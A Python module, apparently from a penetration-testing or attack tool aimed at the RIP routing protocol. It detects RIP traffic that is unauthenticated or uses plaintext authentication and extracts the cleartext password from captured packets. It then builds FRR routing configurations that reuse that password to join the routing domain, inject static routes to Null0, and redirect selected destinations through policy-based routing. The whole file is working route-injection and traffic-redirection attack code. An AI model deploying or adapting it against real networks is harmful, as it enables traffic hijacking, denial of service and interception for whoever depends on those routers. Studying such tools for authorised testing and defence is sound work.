import sys
sys.path.append("..")
import protocol_parser
import utility
from state import user_var


def detect_if_vulnerable(packet):

    # Version 1 of RIP does not support authentication
    if packet['RIP header'].version == 1:
        return True

    elif packet['RIP header'].version == 2 and not packet.haslayer('RIP authentication'):
        return True

    elif packet['RIP header'].version == 2 and packet.haslayer('RIP authentication'):
        # I have not seen authtype 0 in use. RFC states 2 is in use for simple/plain text auth. 
        # Updated RFC states crypto auth uses type 3.
        # But should there exist a case where auth type is set to 0, I think we should cater for it.
        return packet['RIPAuth'].authtype in [2, 0]
    else:
        return False

def get_packet_data(packet):
    sourceMac, sourceIP, destinationMac, destinationIP = protocol_parser.get_data_from_layer_two_and_three(packet)

    version = packet['RIP header'].version

    # get the correct different auth types
    authentication_type = 0
    password = ''

    if packet.haslayer('RIP authentication'):
        authentication_type = packet['RIPAuth'].authtype
        password = packet['RIPAuth'].password.decode('UTF-8').rstrip('\x00')

    return sourceMac, sourceIP, destinationMac, destinationIP, authentication_type, password, version

def build_configurations(packet):

    ripd_config = '' + '!\n'
    ripd_config += 'router rip\n'
    ripd_config += f' network {utility.get_ip_address_from_interface(user_var.interface)}/32\n'


    if user_var.inject_local or user_var.redirect_local:
        ripd_config += ' network 172.17.0.0/16\n'

    ripd_config += f' version {packet.version}\n'

    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:
        count = 0
        # FIXME leaving this here for now
        ripd_config += ' redistribute static\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += f'interface {user_var.interface}\n'
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

        for ip in user_var.redirectaddresses:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

    # if user_var.inject:
    #     # FIXME leaving this here for now
    #     ripd_config += ' redistribute static\n'
    #     staticd_config += '!\n'
    #     for ip in user_var.ipaddress:
    #         # FIXME look into ensuring CIDR is in there.
    #         staticd_config += 'ip route {} Null0\n'.format(ip)

    ripd_config += '!\n'
    staticd_config += '!\n'

    #if packet.version == 2:
    if packet.authentication_type ==  2:
        ripd_config += '!\n'
        ripd_config += f'interface {user_var.interface}\n'
        ripd_config += ' ip rip authentication mode text\n'
        ripd_config += f' ip rip authentication string {packet.password}\n'
        ripd_config += '!\n'

    # FIXME: look into crypto 
    #elif packet.authentication_type ==  3:

    return ripd_config, staticd_config, pbrd_config

def build_peer_zebra_configuration():
    zebrad_config = ''

    if user_var.inject_local or user_var.redirect_local:

        zebrad_config += '!\n'

        count = 0

        counts = []

        for ip in user_var.inject_local_ip_addresses:
            count += 1
            zebrad_config += f'access-list {count}0 seq 1 permit {ip}\n'
            counts.append(count)

        for ip in user_var.redirect_local_ip_addresses:
            count += 1
            zebrad_config += f'access-list {count}0 seq 1 permit {ip}\n'
            counts.append(count)

        zebrad_config += f'access-list {count + 1}0 seq 1 permit any\n'
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap deny 1\n'

        for c in counts:
            zebrad_config += f' match ip address {c}0\n'
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap permit 2\n'
        zebrad_config += f' match ip address {count + 1}0\n'
        zebrad_config += '!\n'
        zebrad_config += 'ip protocol rip route-map rmap\n'

    zebrad_config += '!\n'
    return zebrad_config

def build_peer_configuration(packet):

    ripd_config = '!\n' + 'router rip\n'
    ripd_config += ' network 0.0.0.0/0\n'
    ripd_config += f' version {packet.version}\n'

    staticd_config = ''

    if user_var.inject_local or user_var.redirect_local:

        ripd_config += ' redistribute static\n'

        staticd_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            staticd_config += f'ip route {ip} Null0\n'

        for ip in user_var.redirect_local_ip_addresses:
            staticd_config += f'ip route {ip} Null0\n'

    ripd_config += '!\n'
    staticd_config += '!\n'


    return ripd_config, staticd_config
